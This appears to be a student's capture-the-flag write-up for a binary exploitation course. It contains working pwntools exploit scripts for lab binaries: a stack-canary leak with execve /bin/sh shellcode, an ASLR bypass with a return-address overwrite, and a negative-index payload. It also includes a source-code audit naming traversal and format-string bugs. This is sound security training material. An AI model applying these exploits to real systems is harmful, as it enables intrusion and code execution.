shellcrack
======================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNC1zaGVsbGNyYWNrIiwiaXAiOiIxNDQuMTM2LjI4LjM2Iiwic2Vzc2lvbiI6ImRmOTllNDA1LWNmNDAtNGY2Yi1hZTNhLTZkMjExNjAxNmZiNiJ9.tXTra87lGQzUsQEJC_zj1bS2Ohi_oMpiH0i_fad7gzo}
General overview of problems faced
-------------------------------------------------------
Initial payload behaved strangely. 16 'a's triggered both the first input and second input. It was probably sending 15 'a's,stopped receiving input then sent the last 'a' to the second input.
Had to try different variations to send non-null bytes.
The stack pointer points to our second input, where we will insert our main payload.
Had to find out stack positions to ensure the correct placement of the canary and return address.
Need to leak canary
The stack pointer provided points to the buffer. We can input shellcode in this buffer since we control it and overwrite the return address to return to this buffer where our shellcode will be executed.
Avoid inserting null bytes in the shellcode, push an xor's register to stack instead.
Use nopsled as filler, it's one byte each.
Binary shows the stack allocation of variables up to 58 bytes of the stack. Need to use this to know how many bytes to write to reach the canary and stack address.

Script/Command used
------------------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './shellcrack' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 17840 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# esp is subbed 0x40 bytes, our input writes to esp+0x10
p.recvline()
# fread reads in 16 entries of size byte. (man page)
payload = b'a'*16
payload = payload[:-1]
log.info(f"payload: {payload}")
p.sendline(payload)
# successful leak

log.info(p.recvline())
canary = p.recvline()
canary = canary[:-2]
log.info(f"canary: {canary}")
# Canary acquired

p.recvuntil(b'[', drop=True)
stack_addr = p.recvline()
stack_addr = stack_addr[:-3]
log.info(f"stack address: {stack_addr}")
# Stack address acquired

stack_addr = int(stack_addr, 16)
stack_addr = p32(stack_addr)
log.info(f"stack address: {stack_addr}")
# stack address packed

# Shellcode to execve /bin/sh
my_asm = """
xor ecx, ecx
mul ecx

mov eax, 0xb
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
"""

# Filler nopsled shellcode
nop_asm = """
nop
"""

nopsled = asm(nop_asm)
shellcode = asm(my_asm)

# Construct payload
payload = shellcode
payload += nopsled * (0x40 - 0x10 - len(shellcode))
payload += canary
payload += nopsled * (0x58 - 0x40 - len(canary))
payload += stack_addr + b'\n'
p.sendline(payload)
p.interactive()
```

stack-dump2
=========================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNC1zdGFjay1kdW1wMiIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiIwZWJhOThmOC1mYThkLTRiZGUtOTQ5Yi02OWZlZjllNmQ4NWEifQ.38UEY5YkykICIIkH7Q6vyuVwkIajhP9bqqq5nllJkWE}
General overview of problems faced
----------------------------------------------------------
Mostly similar to stack-dump, except now, I cannot use the fixed addrss of the win function. I need to leak a function address on the stack to calculate the base from the offsets.
Solution works locally at first, but not remotely. Checked ASLR, all addresses were randomised locally which is evidence I have aslr on I believe. Get stack smashing detected remotely.
After testing random changes, it seems the offset to get the stack canary acts strangely. Offset 21 works locally but not remotely. 105 works for both.
Function behaves differently compared to stack-dump.
When selecting a), no matter the len, any input including size that is less than len, it goes to menu immediately.
The script can acquire the canary using b). However, after investigation, selcting b) shows different contents at the same address eg
Script
 Canary: b'memory at 0xffbe4190: \x00\xee\x11Z\x00\x00\x00\x00\x00\x00\x00\x007\xe6^\xf7\x01\x00\x00\x004B\n'
Interactive
memory at 0xffbe4190: \x00\x11\x00\x00\x00\x007\xe6^\xf7\x00\x00B
*** Reminder to ask why the offset behaves strangely ***
Script/Command used
---------------------------------------------------------
```
from pwn import *
import sys
# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './stack-dump2' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 28004 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Possible canary offset from provided stack pointer:
# 21 (0x15), -1363 (0-x553)
# win function offset: 0x76d
# __libc_csu_init offset = 0x9a0
# 0xffe9f84c —▸ 0x5664c9eb (__libc_csu_init+75) ◂— 0x8301c783
# 0xffe9f85c —▸ 0x5664c9c1 (__libc_csu_init+33) ◂— 0xff00838d

p.recvuntil(b'useful stack pointer ', drop=True)
stack_pointer = p.recvline()
log.info(stack_pointer)
stack_pointer_canary = int(stack_pointer, 16) + 105
#log.info(str(stack_pointer_canary))
stack_pointer_function = int(stack_pointer, 16) + 69
#log.info(str(stack_pointer_function))
#
canary_addr = p32(stack_pointer_canary)
# This stack addr points to the __libc_csu_init+75 function address
function_addr = p32(stack_pointer_function)
log.info(str(canary_addr))
log.info(str(function_addr))


# Leak canary
p.recvuntil(b'quit', drop=True)
p.sendline(b'a')
p.recvuntil(b'len: ', drop=True)
p.sendline(b'6')
p.sendline(canary_addr)

p.recvuntil(b'quit', drop=True)
p.sendline(b'b')
p.recvline()
canary = p.recvline()
log.info(f"Canary: {canary}")
canary = canary[22:26]
log.info(f"Canary: {canary}")

# Leak function
p.recvuntil(b'quit', drop=True)
p.sendline(b'a')
p.recvuntil(b'len: ', drop=True)
p.sendline(b'6')

p.sendline(function_addr)

p.recvuntil(b'quit', drop=True)
p.sendline(b'b')
p.recvline()
function = p.recvline()
log.info(f"Function: {function}")
function = function[22:26]
log.info(f"Function: {function}")

# Get base to use the win function offset
function = u32(function)
log.info(f"function: {function}")
base = function - 75 - 0x9a0
win = base + 0x76d
log.info(f"base address: {base}")
win = p32(win)
log.info(str(win))
size = 96 + 4 + 8 + 4 + 1

p.recvuntil(b'quit', drop=True)
p.sendline(b'a')
p.recvuntil(b'len: ', drop=True)
p.sendline(str(size))
payload = b'a'*96 + canary + b'a'*8 + win
p.sendline(payload)

p.interactive()
```

image-viewer
============================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNC1pbWFnZS12aWV3ZXIiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiNmVkNWQ1YjYtY2M1OS00ODc0LTk3NmYtMWNhMGEwMjIzYjRhIn0.V0fOO5Gr01Qs8G-BjZyLv7-PbeLwTD040m8Mbf1AtFY}
General overview of problems faced
----------------------------------------------------------------
Have to somehow get the program to open the flag file.
images holds an array of data structures called image.
The image data structure contains an int and a char *, taking up a total of 8 bytes.
Index is fetched using an atoi to the user input.
Online searches say atoi is vulnerable because it has unpredicatable results if the string cannot be casted to an int properly.
Through testing, most invalid casts make atoi return 0.
However, we cannot use this since it'd be the same as retrieving images[0].
In the binary, buf and images are stored next to each other. We'd probably be able to access them through negative indexing.
For some reason, fgets only accepts 126 bytes even though the buf size is 128. I know fgets accepts n - 1 so it should accept 127, but it doesn't.
Input at where index -2 would be (16 bytes backwards), to avoid any complications with the final part of the payload for the above reason.
Have to maintain the same order as the struct. Int first and then address to string.
Address to buf found in binary. Adjust to where we place our flag.
Need to insert -2 as hex to ensure the id check passes.
Script/Command used
--------------------------------------------------------------
```
# Input password
p.recvuntil(b'> ', drop=True)
# Fill up 16 bytes
payload = b'password123'# + b'\
p.sendline(payload)

# Work with 16 byte blocks for easier visualiation.
p.recvuntil(b'> ', drop=True)
# Input index -2 
payload = b'-2' + b'a'*14
# print(len(payload))
# Place filename + fill to 16 bytes
payload += b'flag' + b'\0' * 12
# print(len(payload))
# Fill until remaining 16 bytes
payload += b'\0' * (16 * 5)
# print(len(payload))
# From the binary, the address to string comes first then the int id.
# Place negaitve index, -2, as hex
payload += b'\xfe\xff\xff\xff'
# print(len(payload))
# Place address that points to our flag string
payload += p32(0x804c070)
# print(len(payload))
# Fill in remaining. Apparently a payload of size 127 or highest doesn't work.
payload += b'\0' * (126 - len(payload))
# print(len(payload))
p.sendline(payload)
p.interactive()

```

source.c challenge
==========================================================
General overview of problems faced
Have to look up the manual for almost all functions to check if they were used correctly, and see if there were known bugs.
Only list memory corruption bugs.
---------------------------------------------------------
lines: Bug
71   : Here the user input argument is appended to the "./webpath/" string. This is a directory traversal vulnerability. Users can input directory traversal commands like ../ to get a file they need. For this particular function, they can open/create any file and write into it. The flag "w" in line 72 means that if the file exists, it's contents are erased and the file will then be written into by the user. This can cause damage to the system if the attacker so wishes. Attackers may write scripts they may be able to run with another vulnerability. Important to note that FILENOTEAVAIL is untrue since fopens with flag "w" creates a new file if it does not exit.
97   : Same as above, we have a directory traversal vulnerablity. However, for this function, it is for the purposes of leaking. Attackers will be able to read a file in any directory using directory traversal in their string such as "..". They would be able to leak important files.
131  : int handle_conn() function does not have return a value, when it should be expecting a return value of type int. In x86 systems, it "returns" whatever is in eax. An attacker could store some malicious data in the eax register, where it may be executed later, with a call eax gadget. Even if the attacker cannot store data in eax directly, the function likely moves many values into eax, and exiting at the right time may allow the attacker to escalate.
139  : This line assigns the return value of write_socket to len. Write_socket has the capacity to return -1. So, we could get len = -1. This is an invalid len. Functions that would utilise this len usually specify the type as size_t which is an unsigned integer type. This can transform the len into a large number, one that the developer was not expecting. This large len can be used to overflow the buffer, or do large reads to leak stuff, since the buffer is not initialised to that large number.
NOTE (research): -1 is 0xFFFFFFFF. size_t is at least 16 bits (4 bytes) and 0xFFFFFFFF would be the highest value size_t can have, even when truncated.
146  : syslog has argument log which is a buffer that snprintf transfer to from use input. The attacker can use format string vulnerability here since the string (for example, %x) can be placed where action + 1 is so the log would show "SERVER: d admin level, attempting command x, args %x" (d can be a number that fits in uint8_t and x can be a hexidecimal fitting a byte). This %x will be treated as a format and expect a second argument. However, syslog does not provide one so it'll grab the next thing on the stack and store it. An attacker can combine this with the READ_PAGE command to read where syslog is stored (normally /var/log/syslog) to leak things on the stack. Of course, with format string vulnerability, they can write into memory using %n.
167  : admin_level is uint8_t, whereas level is type int. The attacker controls what number level is (via SET_PERMISSION_LEVEL) so an input that ends in 00 would result in 0x00 which is 0. For example level = 0x00000100 = 256, would do the trick. The attacker now has admin privileges and can use COMMAND. The attacker can even check if his exploit worked through line 143's snprintf since it dissplays admin level. 
210  : It is possible for fd to be -1 if the accept function fails. There is no check and -1 may be passed as the file descriptor to handle_conn and close, which will likely lead to uncaught errors and cause a crash. However, I can see that fd is used in read_socket's recv() call. This would fail due to EBADF, since sockfd is an invalid file descriptor. recv returns -1 on fail, which the functon handles by returning -1. So we get len = -1 which is an invalid len entry. Since functions that use len are type size_t or unsigned ints, the len could be converted into an unexpectly large number which allows for overflow or large reads. A buffer overflow can be expected from this bug.

*** --- Other bugs tthat don't really meet the spec (for study and notes) *** 
Other bugs that aren't really exploitable through the action of the attacker (pls don't mark me down, I just wanna be thorough in my source code audit practice and learn from the mistakes of others). I jot them down as notes.
69   : unused variable complete = 0
95   : unused variable complete = 0
134  : Unused variable set_permission = 0. Thought of some ways maybe an attacker could somehow use set_permission to set admin level to 0 this way, but I couldn't find a way. Maybe somehow assigning the addresses with level or admin_level? Or maybe as a way to insert 0 onto the stack.
119  : 2nd arg is sizeof(buf) - 1. fgets already applies -1 to the second argument, so the -1 for the 2nd argument is redundant.
128  : Not a bug so that's why it falls here. While the program tries to make this the system function only accessible to admins, attackers will be able to use shell commands to control the system. 
195  : setsockopt can return -1 on failure. A check should be made to ensure that the functions sets the options, protocol level and so on correctly. It is possible if the function fails, attackers can take advantage of the lack of protocols and controls.
196  : Same issue with above, needs a check. Though its hard to say how attackers can take advantage of this.
197  : Same as line 195, needs a check. Again, hard to imagine how an attacker can take advantage of this.

re challenge
=============================================================
General overview of problems faced
Had to look up what some instructions do.
0x2aaaaaab means 2^31/3? Supposedly, its meant to mean divide 3 with imul
sar eax, 0x1f means to set eax to -1 if eax is negative or 0 if eax is positive. Other online sources say its divide 2. Since it helps with rounding.
After calculating for myself, it is 0xFFFFFFF divived by 6. Rounded up.
The sar probably helps with rounded from what I've searched up. It divides by 2^31
which makes it either 0 or 1, depending on the sign.
The movs and adds are doing a multiplication by 6 for the result.
movs into eax and edx to return the computated value.
I had to draw it out and see what it was doing to the arguments.
The result is actually zero? (arg1 + arg2) - 6[(arg1 + arg2)/6]
I must be getting trolled.
-------------------------------------------------------------

```C
int re_this(int arg1, int arg2) {
    int ret = (arg1 + arg2)/6;
    ret = 6*ret;
    ret = (arg1 + arg2) - ret
    return ret;
}
```
